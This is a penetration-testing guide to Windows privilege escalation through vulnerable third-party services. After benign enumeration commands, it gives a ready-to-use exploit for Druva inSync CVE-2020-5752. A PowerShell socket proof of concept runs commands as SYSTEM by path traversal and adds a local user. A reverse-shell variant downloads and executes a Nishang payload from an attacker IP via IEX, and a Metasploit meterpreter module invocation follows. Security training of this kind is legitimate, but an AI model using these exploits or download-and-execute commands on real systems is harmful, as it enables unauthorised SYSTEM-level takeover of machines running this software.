## Vulnerable Services

Third-party applications running as SYSTEM are one of the most reliable privilege escalation sources in real engagements because vendors frequently ship applications with exposed local services that perform insufficient input validation. The methodology is always: enumerate installed software, identify locally listening ports, cross-reference versions against known CVEs, then exploit. 
***

## Step 1: Enumerate Installed Software and Services

```cmd
:: Method 1: wmic - lists all installed MSI-tracked applications
wmic product get name
wmic product get name,version,vendor

:: Method 2: Registry (catches applications not tracked by MSI)
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr "DisplayName\|DisplayVersion"
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr "DisplayName\|DisplayVersion"

:: Method 3: 32-bit applications on 64-bit system
reg query HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall /s | findstr "DisplayName\|DisplayVersion"

:: Method 4: Program Files directories
dir "C:\Program Files" /b
dir "C:\Program Files (x86)" /b
```

```powershell
# PowerShell - cleaner output including version
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher, InstallDate |
    Sort-Object DisplayName

# Combine both registry paths
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,
    HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion, Publisher |
    Where-Object {$_.DisplayName} | Sort-Object DisplayName
```

### Map Locally Listening Ports to Processes

```cmd
:: Find all locally bound ports (127.0.0.1 only - not exposed externally)
netstat -ano | findstr "127.0.0.1.*LISTENING"

:: Full listener list with process IDs
netstat -ano | findstr "LISTENING"

:: Resolve PID to process name
tasklist /svc /fi "PID eq <PID>"
:: Or in PowerShell:
Get-Process -Id <PID>
```

```powershell
# One-liner: map all listening ports to process names
Get-NetTCPConnection -State Listen |
    Select-Object LocalAddress, LocalPort,
    @{Name="Process";Expression={(Get-Process -Id $_.OwningProcess).ProcessName}},
    @{Name="PID";Expression={$_.OwningProcess}} |
    Where-Object {$_.LocalAddress -eq "127.0.0.1"} |
    Sort-Object LocalPort
```

***

## Druva inSync 6.6.3 - CVE-2020-5752

The `inSyncCPHwnet64.exe` service runs as `NT AUTHORITY\SYSTEM` and listens on port 6064. Path validation is implemented only via a `strncmp` check against a valid base path, which can be bypassed using directory traversal (`\..\..\..\`) to execute any binary on the system. No authentication is required since it binds only to localhost. 

### Confirming the Vulnerability

```cmd
:: Confirm Druva is installed and check version
wmic product where "name like 'Druva%'" get name,version

:: Confirm port 6064 is listening
netstat -ano | findstr "6064"

:: Map PID to process
get-process -Id <PID>
:: Should show: inSyncCPHwnet64

:: Confirm service status
get-service | Where-Object {$_.DisplayName -like 'Druva*'}
:: Running -> inSyncCPHService -> Druva inSync Client Service
```

### PowerShell PoC - Add Local Admin User (Low Noise Test)

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"    # Change this to your desired command

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header  = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes(
    "C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd"
)
$length  = [System.BitConverter]::GetBytes($command.Length)

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

### PowerShell PoC - Reverse Shell Variant

```powershell
# Step 1: Prepare shell.ps1 on attack machine
# Append this line to Invoke-PowerShellTcp.ps1 (Nishang):
# Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443

# Step 2: Host it
# python3 -m http.server 8080

# Step 3: Modify $cmd in the PoC
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"

# Step 4: Start listener
# nc -lvnp 9443

# Step 5: Bypass execution policy and run the PoC
Set-ExecutionPolicy Bypass -Scope Process -Force
.\druva_exploit.ps1
```

### Metasploit Module

```
msf6 > use exploit/windows/local/druva_insync_insynccphwnet64_rcp_type_5_priv_esc
msf6 > set SESSION 1
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 > set LHOST 10.10.14.3
msf6 > set LPORT 8443
msf6 > run
```

***

## Generalising the Methodology to Any Third-Party Service

The Druva example illustrates a repeatable process that applies to any locally running service: 

```
1. wmic product get name,version
         |
         v
2. Note any unfamiliar or third-party software
   Searchsploit or Google: "<software name> <version> privilege escalation"
         |
         v
3. netstat -ano | findstr "127.0.0.1.*LISTENING"
   Map PID to process: get-process -Id <PID>
   Confirm service runs as SYSTEM: sc qc <service>
         |
         v
4. If vulnerable exploit found:
   - Review exploit requirements (auth needed? local only? specific version?)
   - Test with low-noise command first: net user /add
   - If successful, escalate to reverse shell
         |
         v
5. Cleanup: remove test user, revert any changed settings
```

***

## Other Common Third-Party LPE Targets

Beyond Druva, other software categories regularly found with SYSTEM-level LPE vulnerabilities:

```powershell
# Backup software - frequently runs as SYSTEM, often has local RPC endpoints
# Examples: Acronis, Veeam, Commvault, Veritas

# AV/EDR software - installs SYSTEM drivers and services
# Older versions sometimes have local privilege escalation paths

# Remote management agents - TeamViewer, ManageEngine, LabTech/ConnectWise
wmic product get name | findstr /i "TeamViewer\|ManageEngine\|LabTech\|Kaseya\|ConnectWise"

# Development tools - Jenkins, Git servers, CI/CD agents
# Often run as SYSTEM and expose web interfaces with RCE vulnerabilities

# VPN clients - often install privileged services
wmic product get name | findstr /i "VPN\|Cisco\|FortiClient\|GlobalProtect\|Windscribe"

# Check running services for non-Microsoft software
Get-WmiObject Win32_Service |
    Where-Object {$_.PathName -notmatch "Windows|Microsoft|system32"} |
    Select-Object Name, StartName, PathName, State |
    Where-Object {$_.StartName -match "System|LocalSystem|SYSTEM"}
```
